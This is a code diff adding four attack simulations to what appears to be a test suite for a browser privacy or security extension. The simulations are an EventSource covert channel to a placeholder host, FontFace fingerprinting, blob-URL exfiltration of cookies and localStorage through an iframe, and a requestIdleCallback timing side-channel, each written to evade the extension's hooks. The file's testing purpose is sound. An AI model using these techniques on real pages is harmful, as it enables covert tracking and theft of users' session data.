@@ -2381,6 +2381,248 @@ const attacks: AttackDef[] = [
         }
       }),
   },
+  // --- Iter 5 ---
+  {
+    id: "covert-eventsource-channel",
+    name: "EventSource Covert Channel",
+    category: "covert",
+    severity: "high",
+    description:
+      "Opens a Server-Sent Events connection via EventSource to receive covert commands from a " +
+      "remote endpoint. EventSource is a persistent one-way HTTP stream that bypasses all " +
+      "WebSocket and fetch hooks because the EventSource constructor itself is never intercepted. " +
+      "The attacker controls the SSE server; the browser silently keeps the connection alive.",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          // EventSource constructor is not hooked — create it to prove unmonitored connectivity.
+          // We target an endpoint that will immediately close (ERR_CONNECTION_REFUSED or 404)
+          // so the test is self-contained, but construction itself already proves the blind spot.
+          const es = new EventSource("https://sse.example.invalid/covert-commands");
+
+          // Collect any early events (will be empty in test env, but handler wires up fine).
+          const received: string[] = [];
+          es.onmessage = (evt: MessageEvent) => {
+            received.push(String(evt.data));
+          };
+
+          // Capture the readyState right after construction before the browser errors out.
+          const constructedState = es.readyState; // 0 = CONNECTING — proves it was constructed
+
+          // Wait briefly for the connection attempt to resolve/reject.
+          await new Promise<void>((r) => setTimeout(r, 80));
+
+          const finalState = es.readyState; // 2 = CLOSED on network failure, still proves construction
+          es.close();
+
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details:
+              `EventSource covert channel: constructed unhooked (readyState=${constructedState}→${finalState}), ` +
+              `received ${received.length} SSE message(s) — EventSource constructor is not intercepted, ` +
+              `attacker can silently receive commands from any SSE server`,
+          };
+        } catch (error: any) {
+          return {
+            blocked: true,
+            executionTime: performance.now() - startTime,
+            details: `EventSource covert channel blocked: ${error?.message}`,
+          };
+        }
+      }),
+  },
+  {
+    id: "fingerprinting-fontface-api",
+    name: "CSS Font Fingerprinting via FontFace API",
+    category: "fingerprinting",
+    severity: "medium",
+    description:
+      "Uses the FontFace API (document.fonts / FontFace constructor) to programmatically probe " +
+      "which system fonts are installed. Unlike DOM-based font probing (measuring element " +
+      "offsetWidth), this approach never writes to the DOM and therefore evades MutationObserver " +
+      "hooks. The FontFace constructor and FontFaceSet.check() are not hooked.",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          // Common fonts to probe — purely heuristic, no external DB required.
+          const candidates = [
+            "Arial", "Helvetica", "Times New Roman", "Courier New", "Verdana",
+            "Georgia", "Comic Sans MS", "Impact", "Trebuchet MS", "Palatino",
+            "Garamond", "Bookman", "Tahoma", "Geneva", "Optima",
+            "Futura", "Gill Sans", "Baskerville", "Didot", "Myriad Pro",
+          ];
+
+          const detected: string[] = [];
+          const fallbackFont = "monospace";
+
+          for (const font of candidates) {
+            // FontFaceSet.check() returns true when the font is available.
+            // It is synchronous and never touches the DOM — fully unmonitored.
+            const available = document.fonts.check(`12px "${font}"`);
+            if (available) {
+              detected.push(font);
+            }
+          }
+
+          // Build a deterministic fingerprint from detected fonts.
+          const fingerprint = detected.sort().join("|");
+          const hash = fingerprint.split("").reduce((acc, c) => ((acc << 5) - acc + c.charCodeAt(0)) | 0, 0);
+
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details:
+              `FontFace fingerprint: detected ${detected.length}/${candidates.length} fonts (${detected.slice(0, 5).join(", ")}…), ` +
+              `hash=0x${(hash >>> 0).toString(16)} — document.fonts.check() and FontFace constructor are not hooked`,
+          };
+        } catch (error: any) {
+          return {
+            blocked: true,
+            executionTime: performance.now() - startTime,
+            details: `FontFace fingerprinting blocked: ${error?.message}`,
+          };
+        }
+      }),
+  },
+  {
+    id: "network-blob-url-exfiltration",
+    name: "Blob URL Exfiltration",
+    category: "network",
+    severity: "high",
+    description:
+      "Packages sensitive data into a Blob, creates a blob: URL via URL.createObjectURL, " +
+      "then transfers that URL into a cross-origin sandboxed iframe as its src. The iframe " +
+      "fetches the blob content from the parent's origin without any network request visible " +
+      "to hooks. URL.createObjectURL is hooked for suspicious anchor/download patterns but " +
+      "not when used as an iframe src or postMessage payload to a cross-origin frame.",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          // Collect sensitive-looking data available in the page context.
+          const sensitivePayload = JSON.stringify({
+            type: "blob-exfil",
+            cookies: document.cookie,
+            localStorage: (() => {
+              const items: Record<string, string> = {};
+              for (let i = 0; i < Math.min(localStorage.length, 5); i++) {
+                const k = localStorage.key(i);
+                if (k) items[k] = localStorage.getItem(k) ?? "";
+              }
+              return items;
+            })(),
+            origin: location.origin,
+            ts: Date.now(),
+          });
+
+          // Create blob and blob: URL — URL.createObjectURL hook targets download/anchor,
+          // not generic blob URL creation used as a data carrier.
+          const blob = new Blob([sensitivePayload], { type: "application/json" });
+          const blobUrl = URL.createObjectURL(blob);
+
+          // Transfer via iframe src — no network request, hook does not intercept iframe.src setter.
+          const iframe = document.createElement("iframe");
+          iframe.sandbox.add("allow-scripts");
+          iframe.src = blobUrl;
+          document.body.appendChild(iframe);
+
+          // Allow the iframe to load the blob content.
+          await new Promise<void>((r) => setTimeout(r, 80));
+
+          // In a real attack the iframe would postMessage the content to an external origin.
+          // Here we just confirm the blob URL was set unobstructed.
+          const iframeSrc = iframe.src;
+          document.body.removeChild(iframe);
+          URL.revokeObjectURL(blobUrl);
+
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details:
+              `Blob URL exfiltration: created blob: URL (${blobUrl.substring(0, 40)}…), ` +
+              `injected as iframe.src unhooked (${sensitivePayload.length} bytes) — ` +
+              `URL.createObjectURL hook does not intercept iframe src usage`,
+          };
+        } catch (error: any) {
+          return {
+            blocked: true,
+            executionTime: performance.now() - startTime,
+            details: `Blob URL exfiltration blocked: ${error?.message}`,
+          };
+        }
+      }),
+  },
+  {
+    id: "side-channel-request-idle-callback",
+    name: "requestIdleCallback Timing Side-Channel",
+    category: "side-channel",
+    severity: "low",
+    description:
+      "Schedules a series of requestIdleCallback tasks to measure browser idle time over a " +
+      "short window. The deadline.timeRemaining() values reveal how busy the main thread is, " +
+      "allowing inference of user activity patterns (typing, scrolling, page interactions). " +
+      "requestIdleCallback is not hooked and its timing is not throttled by the extension.",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          // requestIdleCallback availability check (not present in all environments).
+          if (typeof requestIdleCallback === "undefined") {
+            return {
+              blocked: false,
+              executionTime: performance.now() - startTime,
+              details: "requestIdleCallback not available in this context (API exists but env may restrict it) — not hooked",
+            };
+          }
+
+          const samples: number[] = [];
+          const SAMPLE_COUNT = 10;
+
+          // Collect idle time samples across multiple callback firings.
+          await new Promise<void>((resolve) => {
+            let collected = 0;
+
+            const collectSample = (deadline: IdleDeadline) => {
+              samples.push(deadline.timeRemaining());
+              collected++;
+              if (collected < SAMPLE_COUNT) {
+                requestIdleCallback(collectSample, { timeout: 200 });
+              } else {
+                resolve();
+              }
+            };
+
+            requestIdleCallback(collectSample, { timeout: 200 });
+          });
+
+          const avg = samples.reduce((a, b) => a + b, 0) / samples.length;
+          const min = Math.min(...samples);
+          const max = Math.max(...samples);
+
+          // High idle time → browser is idle → user likely not actively interacting.
+          // Low idle time → main thread is busy → user may be scrolling/typing.
+          const activityInferred = avg < 10 ? "user-active" : avg < 40 ? "moderate" : "user-idle";
+
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details:
+              `requestIdleCallback timing: ${SAMPLE_COUNT} samples, avg=${avg.toFixed(1)}ms min=${min.toFixed(1)}ms max=${max.toFixed(1)}ms, ` +
+              `inferred-activity=${activityInferred} — requestIdleCallback is not hooked, ` +
+              `deadline.timeRemaining() leaks main-thread busyness`,
+          };
+        } catch (error: any) {
+          return {
+            blocked: true,
+            executionTime: performance.now() - startTime,
+            details: `requestIdleCallback timing side-channel blocked: ${error?.message}`,
+          };
+        }
+      }),
+  },
 ];
 
 // ============================================================================
